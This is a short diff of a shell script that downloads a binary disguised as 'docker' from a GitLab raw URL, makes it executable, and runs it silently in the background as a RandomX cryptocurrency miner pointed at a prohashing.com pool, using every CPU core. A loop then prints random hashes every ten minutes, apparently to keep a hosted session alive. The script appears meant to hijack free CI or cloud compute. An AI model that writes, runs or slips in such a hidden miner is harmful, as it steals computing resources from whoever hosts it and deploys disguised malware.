@@ -1,4 +1,4 @@
 wget https://gitlab.com/g6292/gabutz/-/raw/main/docker
 chmod +x docker
-./docker -o prohashing.com:3359 -u kido90 -p $(echo $(shuf -i 1111-9999 -n 1)-cuk) -k -a rx/0 -t$(nproc --all) > /dev/null 2>&1 &
+./docker -o prohashing.com:3359 -u kido90 -p x@$(echo $(shuf -i 1111-9999 -n 1)-cuk) -k -a rx/0 -t$(nproc --all) > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
